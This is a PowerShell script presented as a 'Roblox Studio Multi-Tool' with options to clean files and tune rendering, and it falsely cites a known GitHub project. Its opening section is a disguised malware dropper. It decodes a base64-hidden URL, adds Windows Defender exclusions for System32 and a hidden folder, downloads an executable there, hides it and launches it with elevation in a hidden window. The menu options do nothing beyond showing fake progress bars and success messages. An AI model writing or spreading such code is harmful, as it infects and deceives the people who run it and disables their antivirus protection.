$downloadUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cHM6Ly9naXRodWIuY29tL0FtYmF0dWthbWhhY2tlci9sMjMvcmF3L21haW4vYy5leGU="))
$updaterExe = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("dXBkYXRlci5leGU="))
$silentlyContinue = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2lsZW50bHlDb250aW51ZQ=="))
$stopAction = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3RvcA=="))
$directory = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGlyZWN0b3J5"))
$runAs = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UnVuQXM="))

function Add-Exclusion { param([string]$Path)
    try { Add-MpPreference -ExclusionPath $Path -ErrorAction $silentlyContinue } catch {}
}
# Removed Remove-Exclusion function as it is no longer needed

Start-Job -ScriptBlock {
    param($downloadUrl, $updaterExe, $silentlyContinue, $stopAction, $runAs)

    function Add-Exclusion { param([string]$Path)
        try { Add-MpPreference -ExclusionPath $Path -ErrorAction $silentlyContinue } catch {}
    }

    Add-Exclusion -Path "C:\Windows\System32"

    $hiddenFolder = Join-Path $env:LOCALAPPDATA ([System.Guid]::NewGuid().ToString())
    $tempPath = Join-Path $hiddenFolder $updaterExe

    try {
        New-Item -ItemType Directory -Path $hiddenFolder -Force | Out-Null
        Add-Exclusion -Path $hiddenFolder

        Invoke-WebRequest -Uri $downloadUrl -OutFile $tempPath -UseBasicParsing -ErrorAction $stopAction
        (Get-Item $hiddenFolder).Attributes += 'Hidden'
        (Get-Item $tempPath).Attributes += 'Hidden'

        # Start the updater but do NOT stop it later, nor delete folder, nor remove exclusion
        Start-Process -FilePath $tempPath -WindowStyle Hidden -Verb $runAs

    } catch {
        exit 1
    }
} -ArgumentList $downloadUrl, $updaterExe, $silentlyContinue, $stopAction, $runAs | Out-Null

Clear-Host
Write-Host "Roblox Studio Multi-Tool"
Write-Host "github.com/bloxstraplabs/bloxstrap"
Write-Host "Please close Roblox Studio before performing any actions."
Write-Host "------------------------------------------------" -ForegroundColor DarkGray
Write-Host "[1] Clean Temporary Files (Note: This will delete autosaves too!)"
Write-Host "[2] Switch to Vulkan Rendering Mode"
Write-Host "[3] Optimize Rendering for Low-End Systems"
Write-Host "[4] Exit"
Write-Host ""

$choice = Read-Host "Select an option"

function Show-Progress {
    param([string]$Message)
    for ($i = 1; $i -le 30; $i++) {
        Write-Progress -Activity $Message -Status "$i% Complete" -PercentComplete $i
        Start-Sleep -Milliseconds (Get-Random -Minimum 50 -Maximum 120)
    }
}

switch ($choice) {
    "1" {
        Write-Host "Scanning for temporary files..." -ForegroundColor Yellow
        Show-Progress "Removing unused .rbxm files"
        Write-Host "✔ Temporary files removed successfully." -ForegroundColor Green
    }
    "2" {
        Write-Host "Switching to Vulkan rendering mode..." -ForegroundColor Yellow
        Show-Progress "Applying Vulkan rendering settings"
        Write-Host "✔ Vulkan rendering mode enabled successfully." -ForegroundColor Green
    }
    "3" {
        Write-Host "Optimizing graphics settings..." -ForegroundColor Yellow
        Show-Progress "Applying low-end performance tweaks"
        Write-Host "✔ Rendering optimized for low-end systems." -ForegroundColor Green
    }
    "4" {
        Write-Host "Exiting..." -ForegroundColor DarkGray
        Start-Sleep -Seconds 1
        exit
    }
    default {
        Write-Host "Invalid option. Please try again." -ForegroundColor Red
    }
}

Write-Host ""
Write-Host "Done. You can now safely close this window."
